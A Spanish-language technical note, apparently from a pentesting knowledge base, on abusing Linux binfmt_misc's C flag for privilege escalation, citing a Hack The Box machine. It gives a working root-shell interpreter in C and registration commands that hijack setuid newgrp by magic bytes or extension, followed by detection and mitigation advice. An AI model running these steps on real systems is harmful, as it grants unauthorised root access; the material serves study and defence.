---
title: binfmt_misc — registrar intérpretes y abusar del flag C
tags: [linux, privesc, binfmt_misc, capabilities, setuid]
---

# binfmt_misc: cuando el kernel ejecuta tu intérprete

[🇬🇧 English](binfmt-misc.en.md) | **Español**

## 1. Qué es

`binfmt_misc` permite asociar una extensión o unos *magic bytes* con un intérprete. Al ejecutar un fichero que coincide, el kernel lanza el intérprete con el fichero como argumento, sin necesidad de shebang.

```bash
mount | grep binfmt
ls /proc/sys/fs/binfmt_misc/
cat /proc/sys/fs/binfmt_misc/status
```

El registro se escribe en `/proc/sys/fs/binfmt_misc/register` con el formato:

```text
:name:type:offset:magic:mask:interpreter:flags
```

- `type`: `M` para magic, `E` para extensión.
- `offset`: bytes a saltar antes del magic (ignorado en `E`).
- `magic`: firma o extensión.
- `interpreter`: programa que se ejecuta.
- `flags`: `P` (argv[0] original), `O` (pasar fd), `C` (credenciales del programa), `F` (abrir en registro).

## 2. El flag C

Sin `C`, el intérprete se ejecuta con las credenciales del usuario que invoca. Con `C`, el kernel aplica las credenciales del **binario coincidente**. Si el binario es setuid root, el intérprete corre como root.

```bash
# intérprete que lanza bash
cat > /dev/shm/h.c <<'EOF'
#include <unistd.h>
int main(void) {
    setresuid(0, 0, 0);
    char *argv[] = {"/bin/bash", "-p", NULL};
    execve(argv[0], argv, NULL);
    return 1;
}
EOF
gcc -o /dev/shm/h /dev/shm/h.c
```

Se registra una regla que coincide con los primeros bytes de un setuid conocido:

```bash
MAGIC=$(head -c 30 /usr/bin/newgrp | xxd -p | sed 's/../\\x&/g')
echo ":x:M::$MAGIC::/dev/shm/h:C" | tee /proc/sys/fs/binfmt_misc/register
newgrp
```

Si el usuario no puede escribir `register`, se busca un helper con `cap_dac_override` o un servicio que lo haga por él (como `reg_helper` en Retired).

## 3. Variante por extensión

```bash
ln -s /usr/bin/newgrp /dev/shm/x.sploit
echo ':sploit:E::sploit::/dev/shm/h:C' | tee /proc/sys/fs/binfmt_misc/register
/dev/shm/x.sploit
```

La extensión coincide con el symlink; el binario subyacente sigue siendo setuid.

## 4. Detección

- Escrituras en `/proc/sys/fs/binfmt_misc/register` por procesos que no son `systemd-binfmt`.
- Entradas nuevas en `/proc/sys/fs/binfmt_misc/` con intérpretes en `/tmp`, `/dev/shm` o `/home`.
- Ejecución de `newgrp`, `su` o `mount` desde rutas no habituales.
- Procesos con `cap_dac_override` que escriben en el registro.
- `getcap -r / 2>/dev/null` para inventariar capacidades.

## 5. Mitigación

- Montar `/proc/sys/fs/binfmt_misc` sin permisos de escritura para usuarios.
- No dar `cap_dac_override` a helpers que escriban ficheros del kernel.
- Revisar unidades `systemd-binfmt` y entradas persistentes en `/etc/binfmt.d/`.
- Auditar setuid y capacidades; eliminar los innecesarios.
- Monitorizar la creación de intérpretes en directorios temporales.

## 6. Referencias

- <https://man7.org/linux/man-pages/man5/binfmt_misc.5.html>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
- <https://0xdf.gitlab.io/2022/08/13/htb-retired.html>
